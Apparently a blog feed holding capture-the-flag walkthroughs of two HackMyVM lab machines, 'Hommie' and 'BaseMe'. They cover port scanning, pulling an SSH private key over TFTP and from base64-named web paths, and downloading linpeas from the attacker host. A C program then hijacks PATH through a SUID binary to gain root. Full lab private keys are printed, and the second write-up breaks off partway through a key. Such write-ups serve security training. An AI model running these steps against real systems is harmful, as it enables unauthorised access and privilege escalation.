optimizing for UDP scans:**Example 5.9. Optimizing UDP Scan Time**krad# **`nmap -sUV -T4 -F --version-intensity 0 scanme.nmap.org`**Starting Nmap ( http://nmap.org )Nmap scan report for scanme.nmap.org (64.13.134.52)Not shown: 99 open|filtered portsPORT STATE SERVICE VERSION53/udp open domain ISC BIND 9.3.4Nmap done: 1 IP address (1 host up) scanned in 12.92 secondsExplanation :–&amp;gt; version-intensity 0 to version detection scans Vesion detection (-sV) is often needed to differentiate open from filtered UDP ports. Version detection is relatively slow since it involves sending a large number of application protocol-specific probes to every open or open filtered port found on the target machines. Specifying –version-intensity 0 directs Nmap to try only the probes most likely to be effective against a given port number. –&amp;gt; Scan popular ports first using -FVery few UDP port numbers are commonly used. A scan of the most common 100 UDP ports (using the -F option) will finish quickly. You can then investigate those results while you launch a multi-day 65K-port sweep of the network in the background.–&amp;gt; -sUV When version scanning is enabled with -sV (or -A), it will send UDP probes to every open filtered port (as well as known open ones). If any of the probes elicit a response from an open filtered port, the state is changed to open Improve ReconMoving forward this will be my go to recon steps pre nmap.Step 1. Find all possible active ports using masscan. ┌──(root💀kali)-[/opt/hackmyv/hommie]└─# masscan -p1-65535,U:1-65535 192.168.56.24 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-26 12:00:29 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 22/tcp on 192.168.56.24 Discovered open port 21/tcp on 192.168.56.24 Discovered open port 80/tcp on 192.168.56.24 Step 2. Further enumerate all open|filtered UDP ports using NMAP to find false positive.┌──(root💀kali)-[/opt/hackmyv/hommie]└─# nmap -sUV -T4 -F --version-intensity 0 192.168.56.24 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 03:42 ESTWarning: 192.168.56.24 giving up on port because retransmission cap hit (6).Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 63.00% done; ETC: 03:43 (0:00:18 remaining)Nmap scan report for 192.168.56.24Host is up (0.00047s latency).Not shown: 83 closed udp ports (port-unreach)PORT STATE SERVICE VERSION17/udp open|filtered tcpwrapped19/udp open|filtered tcpwrapped68/udp open|filtered tcpwrapped69/udp open|filtered tftp135/udp open|filtered tcpwrapped138/udp open|filtered tcpwrapped443/udp open|filtered https445/udp open|filtered tcpwrapped500/udp open|filtered isakmp631/udp open|filtered tcpwrapped1028/udp open|filtered tcpwrapped3456/udp open|filtered tcpwrapped5353/udp open|filtered zeroconf31337/udp open|filtered BackOrifice32815/udp open|filtered tcpwrapped49193/udp open|filtered tcpwrapped49194/udp open|filtered tcpwrappedMAC Address: 08:00:27:19:C6:FA (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 91.64 secondsWith this we now have interesting targets such as port 21,22,80 for TCP.And udp Port 69 which runs TFTP!┌──(root💀kali)-[/opt/hackmyv/hommie] └─# nmap -sV -sC -p 21,22,80 192.168.56.24 -o nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-25 22:11 ESTNmap scan report for 192.168.56.24 Host is up (0.00033s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.56.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 0 Sep 30 2020 index.html 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA) | 256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA) |_ 256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519) 80/tcp open http nginx 1.14.2 |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: nginx/1.14.2 MAC Address: 08:00:27:19:C6:FA (Oracle VirtualBox virtual NIC) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds HTTP- TCP 80Feroxbuster shows a index.html file┌──(root💀kali)-[/opt/hackmyv/hommie]└─# feroxbuster --url http://192.168.56.24:80 -x txt,html,php,php.bak,bak,jsp -t 100 -d 1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -o feroxbuster_p80.txt &amp;amp;&amp;amp; sort -k5 -o feroxbuster_p80.txt feroxbuster_p80.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.4.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.56.24:80 🚀 Threads │ 100 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.4.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💾 Output File │ feroxbuster_p80.txt 💲 Extensions │ [txt, html, php, php.bak, bak, jsp] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™──────────────────────────────────────────────────200 4l 14w 99c http://192.168.56.24/index.html[####################] - 9m 8916726/8916726 0s found:1 errors:0 [####################] - 9m 8916726/8916726 16132/s http://192.168.56.24Looks like we are finding alexia id_rsa keys to ssh into the server.┌──(root💀kali)-[/opt/hackmyv/hommie]└─# curl http://192.168.56.24/index.htmlalexia, Your id_rsa is exposed, please move it!!!!!Im fighting regarding reverse shells!-nobodyaFTP - TCP 21Let’s download all the file on ftp onto local machine to see if there’s id_rsa.┌──(root💀kali)-[/opt/hackmyv/hommie] └─# wget -m --no-passive ftp://anonymous:anonymous@192.168.56.24 --2021-12-25 23:09:43-- ftp://anonymous:*password*@192.168.56.24/ =&amp;gt; ‘192.168.56.24/.listing’ Connecting to 192.168.56.24:21... connected. Logging in as anonymous ... Logged in! ==&amp;gt; SYST ... done. ==&amp;gt; PWD ... done. ==&amp;gt; TYPE I ... done. ==&amp;gt; CWD not needed. ==&amp;gt; PORT ... done. ==&amp;gt; LIST ... done. …Look through all the files. http://192.168.56.24/index.html┌──(root💀kali)-[/opt/hackmyv/hommie]└─# ls -la total 28drwxr-xr-x 3 root root 4096 Dec 25 23:09 .drwxr-xr-x 11 root root 4096 Dec 25 22:10 ..drwxr-xr-x 3 root root 4096 Dec 25 23:09 192.168.56.24┌──(root💀kali)-[/opt/hackmyv/hommie/192.168.56.24]└─# ls -laR.:total 16drwxr-xr-x 3 root root 4096 Dec 25 23:09 .drwxr-xr-x 3 root root 4096 Dec 25 23:09 ..-rw-r--r-- 1 root root 0 Sep 30 2020 index.html-rw-r--r-- 1 root root 249 Dec 25 23:09 .listingdrwxr-xr-x 2 root root 4096 Dec 25 23:09 .web./.web:total 16drwxr-xr-x 2 root root 4096 Dec 25 23:09 .drwxr-xr-x 3 root root 4096 Dec 25 23:09 ..-rw-r--r-- 1 root root 99 Sep 30 2020 index.html-rw-r--r-- 1 root root 187 Dec 25 23:09 .listingNo luckTFTP - UDP 69Trivial file protocol uses UDP port 69 and requires no authentication—clients read from, and write to servers.Let’s see if there is a id_rsa stored in the tftp server.┌──(root💀kali)-[/opt/hackmyv/hommie]└─# tftp 192.168.56.24 tftp&amp;gt; get id_rsaReceived 1850 bytes in 0.0 secondstftp&amp;gt; quitShell as alexiaGreat, let’s double confirm it before we SSH as alexia.┌──(root💀kali)-[/opt/hackmyv/hommie]└─# tftp 192.168.56.24 tftp&amp;gt; get id_rsaReceived 1850 bytes in 0.0 secondstftp&amp;gt; quit ┌──(root💀kali)-[/opt/hackmyv/hommie]└─# cat id_rsa -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0yRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOTgCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309jQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBqkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbIM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjMdgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZWrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0BtIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5Td/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiEUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2wpmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtkWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jzbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO60boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9zHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbsy6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtYOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gppivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==-----END OPENSSH PRIVATE KEY----- ┌──(root💀kali)-[/opt/hackmyv/hommie]└─# chmod 600 id_rsa ┌──(root💀kali)-[/opt/hackmyv/hommie]└─# ssh alexia@192.168.56.24 -i id_rsa Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Sep 30 11:06:15 2020alexia@hommie:~$ whoami;id;hostnamealexiauid=1000(alexia) gid=1000(alexia) groups=1000(alexia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)hommieShell as RootDownload LINPEAS to help with priv esc.alexia@hommie:~$ cd /tmpalexia@hommie:/tmp$ wget http://192.168.56.3:1235/linpeas.sh--2021-12-26 07:08:09-- http://192.168.56.3:1235/linpeas.shConnecting to 192.168.56.3:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 330173 (322K) [text/x-sh]Saving to: ‘linpeas.sh’Running the scripts show a very interesting file -rwsr-sr-x 1 root root 17K Sep 30 2020 /opt/showMetheKey. Looks fishy.════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════[+] SUID - Check easy privesc, exploits and write perms[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 63K Jul 27 2018 /usr/bin/passwd ---&amp;gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)-rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/newgrp ---&amp;gt; HP-UX_10.20-rwsr-xr-x 1 root root 83K Jul 27 2018 /usr/bin/gpasswd-rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/chsh-rwsr-xr-x 1 root root 53K Jul 27 2018 /usr/bin/chfn ---&amp;gt; SuSE_9.3/10-rwsr-xr-x 1 root root 35K Jan 10 2019 /usr/bin/umount ---&amp;gt; BSD/Linux(08-1996)-rwsr-xr-x 1 root root 63K Jan 10 2019 /usr/bin/su-rwsr-xr-x 1 root root 51K Jan 10 2019 /usr/bin/mount ---&amp;gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8-rwsr-xr-x 1 root root 427K Jan 31 2020 /usr/lib/openssh/ssh-keysign-rwsr-xr-- 1 root messagebus 50K Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-sr-x 1 root root 17K Sep 30 2020 /opt/showMetheKey---------------------------------------------------------------------------------------- --- Trying to execute /opt/showMetheKey with strace in order to look for hijackable libraries...access(&quot;/etc/suid-debug&quot;, F_OK) = -1 ENOENT (No such file or directory)access(&quot;/etc/suid-debug&quot;, F_OK) = -1 ENOENT (No such file or directory)access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory)openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3wait4(12781, -----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY---------------------------------------------------------------------------------------------After running the file, it looks like it output the id_rsa of alexia ssh keys.Looking at the file using strings Command ,As you can see it really does read’s the current user ssh key : cat $HOME/.ssh/id_rsaalexia@hommie:/tmp$ strings /opt/showMetheKey /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid system __cxa_finalize setgid __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u/UH []A\\A]A^A_ cat $HOME/.ssh/id_rsa This is a PATH Environment Variable exploitIf a script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the executed command in the script.Because cat command isn’t an absolute path, we can abuse this!We can create a script which runs as cat that can make us root!alexia@hommie:/tmp$ cat cat.c int main() {setuid(0);system(&quot;/bin/bash -p&quot;);}alexia@hommie:/tmp$ gcc -o cat cat.ccat.c: In function ‘main’:cat.c:2:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] setuid(0); ^~~~~~cat.c:3:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration] system(&quot;/bin/bash -p&quot;); ^~~~~~alexia@hommie:/tmp$ echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gamesPrepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell:alexia@hommie:/tmp$ PATH=.:$PATH /opt/showMetheKeyroot@hommie:/tmp# whoami;idrootuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)root@hommie:/root# cat note.txt I dont remember where I stored root.txt !!!root@hommie:/# find . -name root.txt./usr/include/root.txtAnd we are root!" }, { "title": "BaseMe", "url": "/posts/BaseME/", "categories": "hackmyvm, easyy", "tags": "Readable files or script, base64", "date": "2021-12-25 19:50:00 +0800", "snippet": "OverviewCTF like box Box Difficulty Link Easy hackmyvm Link ReconObjective : Find out all the open ports and do a nmap service scan.┌──(root💀kali)-[/opt/hackmyv/baseme] └─# rustscan -a 192.168.56.23 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : -------------------------------------- Real hackers hack time ⌛ [~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.56.23:22Open 192.168.56.23:80 We can see that there’s 2 open port. Port 22 and 80.nmap output shows the below:┌──(root💀kali)-[/opt/hackmyv/baseme]└─# nmap -sV -sC 192.168.56.23 -p 22,80 -o nmap.txtStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-25 01:56 ESTNmap scan report for 192.168.56.23Host is up (0.00048s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)| 256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)|_ 256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)80/tcp open http nginx 1.14.2|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:E9:64:8A (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.92 secondsLet’s enumerate port 80!HTTP- TCP 80Gobuster shows that there’s only index.html┌──(root💀kali)-[/opt/hackmyv/baseme]└─# gobuster dir -u http://192.168.56.23:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.23:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,php.bak,bak,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/25 01:57:59 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.23:80/index.html (Status: 200) [Size: 276] ===============================================================2021/12/25 01:59:42 Finished===============================================================Looking at the file shows something interesting.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# curl http://192.168.56.23/index.htmlQUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&amp;lt;!--iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesme--&amp;gt;Lets Base64 decode the encrypted first line.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# echo -n &quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot; | base64 -dALL, absolutely ALL that you need is in BASE64.Including the password that you need :)Remember, BASE64 has the answer to all your questions.-lucasLooks like a big hint is that everything we are going to search fore or use is in base64. Moving forward we must know that EVERYTHING has to be in base64! From folders to password!Let’s save the information we found and encode it in base64 first.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# cat dic.txt iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesmeFor each line in file, base64 encode it line by line and save it to file while read line; do base64 &amp;lt;&amp;lt;&amp;lt; &quot;$line&quot;; done &amp;lt; input.txt &amp;gt;&amp;gt; output.txt.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# while read line; do base64 &amp;lt;&amp;lt;&amp;lt; &quot;$line&quot;; done &amp;lt; dic.txt &amp;gt;&amp;gt; dic_b64.txt ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# cat dic_b64.txt aWxvdmV5b3UKeW91bG92ZXlvdQo=c2hlbG92ZXN5b3UKaGVsb3Zlc3lvdQo=d2Vsb3ZleW91Cg==dGhleWhhdGVzbWUKLet’s enumerate the files again this time using gobuster with filename which are in base64.To do that, we have to convert the files into base64 encoded.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# while read line; do base64 &amp;lt;&amp;lt;&amp;lt; &quot;$line&quot;; done &amp;lt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt &amp;gt;&amp;gt; directory-list-2.3-medium-base64e.txt ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# head directory-list-2.3-medium-base64e.txt IyBkaXJlY3RvcnktbGlzdC0yLjMtbWVkaXVtLnR4dAo=Iwo=IyBDb3B5cmlnaHQgMjAwNyBKYW1lcyBGaXNoZXIKIwo=IyBUaGlzIHdvcmsgaXMgbGljZW5zZWQgdW5kZXIgdGhlIENyZWF0aXZlIENvbW1vbnMKIyBBdHRyaWJ1dGlvbi1TaGFyZSBBbGlrZSAzLjAgTGljZW5zZS4gVG8gdmlldyBhIGNvcHkgb2YgdGhpcwo=IyBsaWNlbnNlLCB2aXNpdCBodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS1zYS8zLjAvCg==IyBvciBzZW5kIGEgbGV0dGVyIHRvIENyZWF0aXZlIENvbW1vbnMsIDE3MSBTZWNvbmQgU3RyZWV0┌──(root💀kali)-[/opt/hackmyv/baseme] └─# gobuster dir -u http://192.168.56.23:80 -w directory-list-2.3-medium-base64e.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.56.23:80 [+] Method: GET [+] Threads: 100 [+] Wordlist: directory-list-2.3-medium-base64e.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: bak,jsp,txt,html,php,php.bak [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/12/25 04:24:18 Starting gobuster in directory enumeration mode =============================================================== ===============================================================2021/12/25 04:26:04 Finished===============================================================Sadly, Nothing found :(Let’s try more. ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# while read line; do base64 &amp;lt;&amp;lt;&amp;lt; &quot;$line&quot;; done &amp;lt; /usr/share/seclists/Discovery/Web-Content/common.txt &amp;gt;&amp;gt; common-base64e.txt ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# head common-base64e.txt LmJhc2hfaGlzdG9yeQo=LmJhc2hyYwo=LmNhY2hlCg==LmNvbmZpZwo=LmN2cwo=LmN2c2lnbm9yZQo=LmZvcndhcmQKLmdpdAo=LmdpdC1yZXdyaXRlCg==LmdpdC9IRUFECg== ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# gobuster dir -u http://192.168.56.23:80 -w common-base64e.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.23:80[+] Method: GET[+] Threads: 100[+] Wordlist: common-base64e.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: jsp,txt,html,php,php.bak,bak[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/25 04:31:16 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.23:80/aWRfcnNhCg== (Status: 200) [Size: 2537]http://192.168.56.23:80/cm9ib3RzLnR4dAo= (Status: 200) [Size: 25] ===============================================================2021/12/25 04:31:19 Finished===============================================================Nice!Shell as lucasWe can see that after decoding the base64 we have id_rsa and robots.txt.Base64 decode the strings shows ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# echo &quot;aWRfcnNhCg==&quot; | base64 -did_rsa ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# echo &quot;cm9ib3RzLnR4dAo=&quot; | base64 -d robots.txtLet’s save the id_rsa!┌──(root💀kali)-[/opt/hackmyv/baseme] └─# curl http://192.168.56.23/aWRfcnNhCg== | base64 -d &amp;gt; id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2537 100 2537 0 0 1792k 0 --:--:-- --:--:-- --:--:-- 2477k -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YULBtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyvf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5XYFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpKxkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbiNNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZzjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDIpxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJMJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mVtVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWhi6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xwN7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuMAif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQO+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rLND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdB